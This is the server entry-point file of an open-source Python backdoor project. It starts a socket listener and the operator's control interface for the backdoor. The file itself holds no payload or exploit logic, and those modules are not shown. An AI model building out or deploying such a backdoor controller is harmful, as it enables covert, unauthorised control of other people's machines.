"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

from path_wrapper import wrap
wrap()

from src.args import Args
from src import logger
from src.server.control import Control
from src.server.socket import Socket
from src.server.view import View


class Server:
    def __init__(self):
        self._args = Args(self)
        logger.init(self._args.get_args())

        self.socket = Socket(self._args.get_args().port)
        self.control = Control(self.socket)

    def start(self):
        self.socket.listen_asych()

        View(self.control)


if __name__ == "__main__":
    Server().start()
